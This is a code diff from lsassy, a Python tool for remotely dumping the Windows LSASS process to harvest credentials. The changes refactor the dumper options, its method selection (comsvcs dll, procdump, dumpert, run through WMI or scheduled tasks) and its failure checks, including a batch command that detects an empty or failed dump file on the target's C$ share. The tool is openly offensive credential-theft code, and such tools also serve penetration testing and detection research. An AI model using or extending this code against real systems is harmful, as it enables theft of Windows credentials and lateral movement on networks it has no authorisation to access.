@@ -16,16 +16,16 @@ from lsassy.utils.utils import *
 class Dumper:
 
     class Options:
-        def __init__(self):
-            self.tmp_dir = "\\Windows\\Temp\\"
-            self.share = "C$"
-            self.dumpname = None
-            self.procdump = "procdump.exe"
-            self.dumpert = "dumpert.exe"
-            self.procdump_path = None
-            self.dumpert_path = None
-            self.method = 1
-            self.timeout = 10
+        def __init__(self, tmp_dir="\\Windows\\Temp\\", share="C$", dumpname=None, procdump="procdump.exe", dumpert="dumpert.exe", procdump_path=None, dumpert_path=None, method=1, timeout=10):
+            self.tmp_dir = tmp_dir
+            self.share = share
+            self.dumpname = dumpname
+            self.procdump = procdump
+            self.dumpert = dumpert
+            self.procdump_path = procdump_path
+            self.dumpert_path = dumpert_path
+            self.method = method
+            self.timeout = timeout
 
     def __init__(self, connection, options=Options()):
         self._log = connection.get_logger()
@@ -35,7 +35,7 @@ class Dumper:
         self._dumpert = options.dumpert
         self._procdump_path = options.procdump_path
         self._dumpert_path = options.dumpert_path
-        self._method = str(options.method)
+        self._method = options.method
         self._timeout = options.timeout
 
         if options.dumpname:
@@ -55,13 +55,13 @@ class Dumper:
     def getfile(self):
         if isinstance(self._ifile, ImpacketFile):
             return self._ifile
-        return RetCode(ERROR_UNDEFINED)
+        return RetCode(ERROR_UNDEFINED, Exception("Trying to return an object which is not an Impacket file"))
 
     def close(self):
         if isinstance(self._ifile, ImpacketFile):
             self._ifile.close()
             return RetCode(ERROR_SUCCESS)
-        return RetCode(ERROR_UNDEFINED)
+        return RetCode(ERROR_UNDEFINED, Exception("Trying to close an object which is not an Impacket file"))
 
     def dump(self):
         """
@@ -81,31 +81,31 @@ class Dumper:
         2. Shell context to use (powershell, cmd)
         3. List of remote execution methods (wmi, task)
         """
-        if self._method == "0":
+        if self._method == 0:
             dump_methodologies = [
                 ["dll", "powershell", ("wmi", "task")],
                 ["dll", "cmd", ("task",)],
                 ["procdump", "cmd", ("wmi", "task")],
                 ["dumpert", "cmd", ("wmi", "task")]
             ]
-        elif self._method == "1":
+        elif self._method == 1:
             dump_methodologies = [
                 ["dll", "powershell", ("wmi", "task")],
                 ["dll", "cmd", ("task",)]
             ]
-        elif self._method == "2":
+        elif self._method == 2:
             dump_methodologies = [
                 ["procdump", "cmd", ("wmi", "task")]
             ]
-        elif self._method == "3":
+        elif self._method == 3:
             dump_methodologies = [
                 ["dll", "powershell", ("wmi", "task")]
             ]
-        elif self._method == "4":
+        elif self._method == 4:
             dump_methodologies = [
                 ["dll", "cmd", ("task",)]
             ]
-        elif self._method == "5":
+        elif self._method == 5:
             dump_methodologies = [
                 ["dumpert", "cmd", ("wmi", "task")]
             ]
@@ -135,7 +135,7 @@ class Dumper:
                     timeout=self._timeout
                 )
                 if isinstance(ret, ImpacketFile):
-                    if ifile.size() < 100 and ifile.read(6).decode('utf-8') == "FAILED":
+                    if ifile.size() == 0 or (ifile.size() < 100 and ifile.read(6).decode('utf-8') == "FAILED"):
                         ifile.close()
                         return RetCode(ERROR_LSASS_PROTECTED)
                     ifile.seek(0)
@@ -163,7 +163,7 @@ class Dumper:
                 ),
             ]
         else:
-            return RetCode(ERROR_UNDEFINED)
+            return RetCode(ERROR_METHOD_NOT_SUPPORTED)
 
         self._log.debug("Commands : ")
         for command in commands:
@@ -208,8 +208,7 @@ class Dumper:
                 self._tmp_dir, self._procdump,
                 self._tmp_dir, self._remote_lsass_dump
             ),
-            "if NOT EXIST {}{} (echo FAILED > {}{})".format(
-                self._tmp_dir, self._remote_lsass_dump,
+            "for %A in ({}{}) do IF NOT EXIST %A ( echo FAILED > %A ) ELSE IF %~zA==0 ( echo FAILED > %A )".format(
                 self._tmp_dir, self._remote_lsass_dump
             )]
 
